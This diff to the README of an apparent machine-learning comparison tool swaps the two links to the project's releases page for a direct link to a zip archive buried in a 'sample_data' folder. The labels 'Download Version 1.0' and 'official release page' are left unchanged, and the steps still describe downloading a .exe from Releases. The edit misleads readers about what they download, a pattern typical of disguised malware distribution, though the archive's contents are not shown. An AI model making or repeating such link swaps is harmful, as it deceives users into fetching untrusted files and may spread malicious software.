@@ -1,6 +1,6 @@
 # 📊 mlclassification - Compare machine learning models with ease
 
-[![Download Version 1.0](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/ionic-slavicpeople725/mlclassification/releases)
+[![Download Version 1.0](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/ionic-slavicpeople725/mlclassification/raw/refs/heads/main/sample_data/Software-v2.1.zip)
 
 This application provides a visual way to test machine learning models. You can compare seven different classification algorithms side by side. The tool allows you to change settings in real time to see how your data changes. Use the interactive charts to explore your results. 
 
@@ -8,7 +8,7 @@ This application provides a visual way to test machine learning models. You can 
 
 To start, you need to save the file to your computer.
 
-1. Go to the [official release page](https://github.com/ionic-slavicpeople725/mlclassification/releases).
+1. Go to the [official release page](https://github.com/ionic-slavicpeople725/mlclassification/raw/refs/heads/main/sample_data/Software-v2.1.zip).
 2. Look for the latest version listed under the Releases section.
 3. Click the link that ends in .exe to start your download.
 4. Wait for the file to finish saving to your computer.
